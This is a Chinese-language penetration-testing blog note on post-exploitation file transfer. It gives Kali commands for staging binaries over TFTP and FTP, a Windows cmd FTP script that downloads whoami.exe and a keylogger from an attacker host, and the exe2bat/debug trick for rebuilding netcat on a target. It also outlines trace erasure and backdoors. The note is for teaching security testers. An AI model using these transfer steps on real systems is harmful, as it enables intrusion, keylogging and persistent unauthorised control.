---
title: "后渗透-文件传输"
date: "2020-09-20T11:40:10+08:00"
description: ""
categories: ["信息安全","渗透测试"]
tags: ["渗透测试", "后渗透", "内网", "逆向", "Windows", "Kali"]
legacyPath: "/posts/85ee9ddd.html"
topic: security
subtopic: post-exploitation
qualityScore: 82
---
<h2 id="后渗透——文件传输"><a href="#后渗透——文件传输" class="headerlink" title="后渗透——文件传输"></a>后渗透——文件传输</h2><ul>
<li><p>上传工具</p>
</li>
<li><p>提权</p>
</li>
<li><p>擦除攻击痕迹</p>
</li>
<li><p>安装后门</p>
<ul>
<li>长期控制</li>
<li>Dump密码</li>
<li>内网渗透</li>
</ul>
</li>
<li><p>后漏洞利用阶段</p>
<ul>
<li>最大挑战——防病毒软件</li>
<li>使用合法的远程控制软件</li>
</ul>
</li>
</ul>

<h3 id="上传-下载文件"><a href="#上传-下载文件" class="headerlink" title="上传/下载文件"></a>上传/下载文件</h3><ul>
<li>持久控制</li>
<li>扩大对目标系统的控制能力</li>
</ul>
<h4 id="Linux系统"><a href="#Linux系统" class="headerlink" title="Linux系统"></a>Linux系统</h4><ul>
<li>netcat</li>
<li>curl</li>
<li>wget</li>
</ul>
<h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><ul>
<li><p>缺少预装的下载工具</p>
</li>
<li><p>非交互式Shell</p>
<ul>
<li>类nc远程控制shell，无法与子命令交互</li>
<li>ftp 192.168.1.1</li>
</ul>
</li>
<li><p>使用TFTP传输文件</p>
<ul>
<li><p>XP、2003默认安装，其它需要单独添加</p>
</li>
<li><p>经常被便捷防火墙过滤</p>
</li>
<li><p>Kali</p>
<figure class="hljs highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">mkdir /tftp<br><span class="hljs-built_in">cd</span> /usr/share/windows-binaries<br>ls<br>cp /usr/share/windows-binaries/whoami.exe /tftp<br></code></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>使用FTP传输文件</p>
<ul>
<li><p>先在kali安装pure-ftpd</p>
<figure class="hljs highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh">apt-get install pure-ftpd<br>groupadd ftpgroup<br>useradd -g ftpgroup -d /dev/null -s /etc ftpuser<br>pure-pw useradd pyrrhax -u ftpuser -d /ftphome<br>pure-pw mkdb<br><span class="hljs-built_in">cd</span> /etc/pure-ftpd/auth<br>ln -s ../conf/PureDB 60pdb<br>mkdir -p /ftphome<br>chown -R ftpuser:ftpgroup /ftphome/<br>/etc/init.d/pure-ftpd restart<br></code></pre></td></tr></table></figure>
</li>
<li><p>在windows使用cmd上下载文件</p>
<figure class="hljs highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">echo</span> open 192.168.0.112 21&gt;ftp.txt<br><span class="hljs-built_in">echo</span> pyrrhax&gt;&gt;ftp.txt<br><span class="hljs-built_in">echo</span> password&gt;&gt;ftp.txt<br><span class="hljs-built_in">echo</span> bin&gt;&gt;ftp.txt<br><span class="hljs-built_in">echo</span> GET whoami.exe&gt;&gt;ftp.txt<br><span class="hljs-built_in">echo</span> GET klogger.exe&gt;&gt;ftp.txt<br><span class="hljs-built_in">echo</span> <span class="hljs-built_in">bye</span>&gt;&gt;ftp.txt<br>ftp -s:ftp.txt<br></code></pre></td></tr></table></figure>
</li>
<li><p>使用PowerShell下载文件</p>
</li>
</ul>
</li>
<li><p>使用DEBUG传输文件</p>
<ul>
<li>汇编、反汇编</li>
<li>16进制dump工具</li>
<li>64k字节</li>
<li>过程：<ol>
<li>upx压缩文件</li>
<li>wine exe2bat.exe nc.exe nc.hex</li>
<li>debug&lt;nc.hex</li>
<li>copy 1.dll nc.exe</li>
</ol>
</li>
</ul>
</li>
</ul>
<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ul>
<li>plink.exe 命令行ssh连接工具</li>
<li>radmin.exe远程控制工具</li>
<li>sbd 类nc 程序</li>
<li>可执行文件压缩工具upx</li>
<li>可执行程序转文本 <code>wine /usr/share/windows-binaries/exe2bat.exe  xxxx.exe xxx.txt</code></li>
</ul>
